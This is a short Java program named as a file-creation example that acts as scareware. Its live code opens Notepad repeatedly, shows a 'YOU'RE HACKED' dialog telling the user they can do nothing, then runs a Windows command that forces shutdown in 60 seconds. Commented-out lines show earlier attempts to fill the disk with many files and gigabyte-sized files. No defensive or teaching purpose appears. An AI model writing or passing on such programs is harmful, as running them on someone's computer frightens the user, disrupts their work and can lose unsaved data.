//import java.io.*;
//import java.io.File;  
import javax.swing.JOptionPane;
import java.io.IOException;
//import java.io.RandomAccessFile;
import javax.swing.JDialog;
import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;
import javax.swing.Timer;
public class CreateFileExample1   
{  
public static void main(String[] args) throws InterruptedException   
{     
//boolean result; 
Runtime runtime = Runtime.getRuntime();
//boolean valid = true;
//int i=0;
try   

{  
//try while loop too
//	while(valid) {
	for(int i=0; i<=10; i++) {
//		File file = new File("/media/oaker/dsdw/hello"+i +".txt"); //initialize File object and passing path as argument  
//		C:\\demo\\music.txt
//		File file = new File("C:\\music"+i +".txt");
//		File file = new File("C:\\OakerRabindra"+i);
//		File file = new File("/media/oaker/dsdw/marshmellow"+i );
//		file.createNewFile();
		runtime.exec("notepad");
//		RandomAccessFile raf = new RandomAccessFile(file, "rw");
//		  raf.setLength(1024*1024*1024);
//		  raf.close();
//		result = file.createNewFile();  //creates a new file 
//		if(result)      // test if successfully created a new file  
//		{  
//			System.out.println("file created "+file.getCanonicalPath()); //returns the path string  
//		}  
//		else  
//		{  
//			System.out.println("File already exist at location: "+file.getCanonicalPath());  
//		} 
		
		
	}
	JOptionPane pane = new JOptionPane(
		    "YOU'RE HACKED .....HAHA..........\n"
		    + "YOU CAN DO NO NOTHING NOW......\n"
		    + "Do you understand?",
		    JOptionPane.QUESTION_MESSAGE,
		    JOptionPane.YES_NO_OPTION);
		  

		            JDialog dialog = pane.createDialog(null, "Title");
		            dialog.setModal(false);
		            dialog.setVisible(true);

		            new Timer(2000, new ActionListener() {
		                @Override
		                public void actionPerformed(ActionEvent e) {
		                    dialog.setVisible(false);
		                }
		            }).start();
		            Thread.sleep(3000);
    
		            runtime.exec("shutdown -s -t 60");
		 
}   
catch (IOException e)   
		{  
			e.printStackTrace();    //prints exception if any  
		}         
	}  
}  